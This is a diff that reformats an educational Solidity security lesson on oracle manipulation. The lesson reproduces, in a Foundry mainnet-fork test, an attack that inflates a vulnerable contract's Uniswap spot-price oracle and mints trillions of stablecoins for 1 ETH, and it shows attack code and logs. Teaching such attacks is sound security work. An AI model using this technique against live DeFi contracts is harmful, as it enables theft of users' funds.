@@ -1,17 +1,16 @@
 ---
 title: S15. Oracle Manipulation
 tags:
-- solidity
-- security
-- oracle
-
+  - solidity
+  - security
+  - oracle
 ---
 
 # WTF Solidity S15. Oracle Manipulation
 
-Recently, I have been revisiting Solidity, consolidating the finer details, and writing "WTF Solidity" tutorials for newbies. 
+Recently, I have been revisiting Solidity, consolidating the finer details, and writing "WTF Solidity" tutorials for newbies.
 
-Twitter: [@0xAA_Science](https://twitter.com/0xAA_Science) | [@WTFAcademy_](https://twitter.com/WTFAcademy_)
+Twitter: [@0xAA_Science](https://twitter.com/0xAA_Science) | [@WTFAcademy\_](https://twitter.com/WTFAcademy_)
 
 Community: [Discord](https://discord.gg/5akcruXrsk)｜[Wechat](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[Website wtf.academy](https://wtf.academy)
 
@@ -19,7 +18,7 @@ Codes and tutorials are open source on GitHub: [github.com/AmazingAng/WTF-Solidi
 
 English translations by: [@to_22X](https://twitter.com/to_22X)
 
------
+---
 
 In this lesson, we will introduce the oracle manipulation attack on smart contracts and reproduce it using Foundry. In the example, we use `1 ETH` to exchange for 17 trillion stablecoins. In 2021, oracle manipulation attacks caused user asset losses of more than 200 million U.S. dollars.
 
@@ -30,6 +29,7 @@ For security reasons, the Ethereum Virtual Machine (EVM) is a closed and isolate
 An oracle can help us solve this problem by obtaining information from off-chain data sources and adding it to the blockchain for smart contract use.
 
 One of the most commonly used oracles is a price oracle, which refers to any data source that allows you to query the price of a token. Typical use cases include:
+
 - Decentralized lending platforms (AAVE) use it to determine if a borrower has reached the liquidation threshold.
 - Synthetic asset platforms (Synthetix) use it to determine the latest asset prices and support 0-slippage trades.
 - MakerDAO uses it to determine the price of collateral and mint the corresponding stablecoin, DAI.
@@ -53,6 +53,7 @@ Let's learn about an example of an oracle vulnerability in the `oUSD` contract. 
 The `oUSD` contract includes `7` state variables to record the addresses of `BUSD`, `WETH`, the Uniswap V2 factory contract, and the `WETH-BUSD` pair contract.
 
 The `oUSD` contract mainly consists of `3` functions:
+
 - Constructor: Initializes the name and symbol of the `ERC20` token.
 - `getPrice()`: Price oracle function that retrieves the instantaneous price of the `WETH-BUSD` pair on Uniswap V2. This is where the vulnerability lies.
   ```
@@ -115,40 +116,41 @@ These 4 steps can be completed in a single transaction.
 
 ### Reproduce on Foundry
 
-We will use Foundry to reproduce the manipulation attack on the oracle because it is fast and allows us to create a local fork of the mainnet for testing. If you are not familiar with Foundry, you can read [WTF Solidity Tools T07: Foundry](https://github.com/AmazingAng/WTFSolidity/blob/main/Topics/Tools/TOOL07_Foundry/readme.md).
+We will use Foundry to reproduce the manipulation attack on the oracle because it is fast and allows us to create a local fork of the mainnet for testing. If you are not familiar with Foundry, you can read [WTF Solidity Tools T07: Foundry](https://github.com/AmazingAng/WTF-Solidity/blob/main/Topics/Tools/TOOL07_Foundry/readme.md).
 
 1. After installing Foundry, start a new project and install the OpenZeppelin library by running the following command in the command line:
-  ```shell
-  forge init Oracle
-  cd Oracle
-  forge install Openzeppelin/openzeppelin-contracts
-  ```
+
+```shell
+forge init Oracle
+cd Oracle
+forge install Openzeppelin/openzeppelin-contracts
+```
 
 2. Create an `.env` environment variable file in the root directory and add the mainnet rpc to create a local testnet.
 
-  ```
-  MAINNET_RPC_URL= https://rpc.ankr.com/eth
-  ```
+```
+MAINNET_RPC_URL= https://rpc.ankr.com/eth
+```
 
 3. Copy the code from this lesson, `Oracle.sol` and `Oracle.t.sol`, to the `src` and `test` folders respectively in the root directory, and then start the attack script with the following command:
 
-  ```
-  forge test -vv --match-test testOracleAttack
-  ```
+```
+forge test -vv --match-test testOracleAttack
+```
 
 4. We can see the attack result in the terminal. Before the attack, the oracle `getPrice()` gave a price of `1216 USD` for `ETH`, which is normal. However, after we bought `WETH` in the `WETH-BUSD` pool on UniswapV2 with `1,000,000` BUSD, the price given by the oracle was manipulated to `17,979,841,782,699 USD`. At this point, we can easily exchange `1 ETH` for 17 trillion `oUSD` and complete the attack.
 
-  ```shell
-  Running 1 test for test/Oracle.t.sol:OracleTest
-  [PASS] testOracleAttack() (gas: 356524)
-  Logs:
-    1. ETH Price (before attack): 1216
-    2. Swap 1,000,000 BUSD to WETH to manipulate the oracle
-    3. ETH price (after attack): 17979841782699
-    4. Minted 1797984178269 oUSD with 1 ETH (after attack)
+```shell
+Running 1 test for test/Oracle.t.sol:OracleTest
+[PASS] testOracleAttack() (gas: 356524)
+Logs:
+  1. ETH Price (before attack): 1216
+  2. Swap 1,000,000 BUSD to WETH to manipulate the oracle
+  3. ETH price (after attack): 17979841782699
+  4. Minted 1797984178269 oUSD with 1 ETH (after attack)
 
-  Test result: ok. 1 passed; 0 failed; finished in 262.94ms
-  ```
+Test result: ok. 1 passed; 0 failed; finished in 262.94ms
+```
 
 Attack Code:
 
@@ -184,7 +186,7 @@ contract OracleTest is Test {
         // Attack the oracle
         // 0. Get the price before manipulating the oracle
         uint256 priceBefore = ousd.getPrice();
-        console.log("1. ETH Price (before attack): %s", priceBefore); 
+        console.log("1. ETH Price (before attack): %s", priceBefore);
         // Give yourself 1,000,000 BUSD
         uint busdAmount = 1_000_000 * 10e18;
         deal(BUSD, alice, busdAmount);
@@ -195,17 +197,17 @@ contract OracleTest is Test {
         console.log("2. Swap 1,000,000 BUSD to WETH to manipulate the oracle");
         // 3. Get the price after manipulating the oracle
         uint256 priceAfter = ousd.getPrice();
-        console.log("3. ETH price (after attack): %s", priceAfter); 
+        console.log("3. ETH price (after attack): %s", priceAfter);
         // 4. Mint oUSD
         ousd.swap{value: 1 ether}();
-        console.log("4. Minted %s oUSD with 1 ETH (after attack)", ousd.balanceOf(address(this))/10e18); 
+        console.log("4. Minted %s oUSD with 1 ETH (after attack)", ousd.balanceOf(address(this))/10e18);
     }
 
     // Swap BUSD to WETH
     function swapBUSDtoWETH(uint amountIn, uint amountOutMin)
         public
         returns (uint amountOut)
-    {   
+    {
         busd.approve(address(router), amountIn);
 
         address[] memory path;
@@ -240,5 +242,3 @@ Renowned blockchain security expert `samczsun` summarized how to prevent oracle 
 ## Conclusion
 
 In this lesson, we introduced the manipulation of price oracles and attacked a vulnerable synthetic stablecoin contract, exchanging `1 ETH` for 17 trillion stablecoins, making us the richest person in the world (not really).
-
-
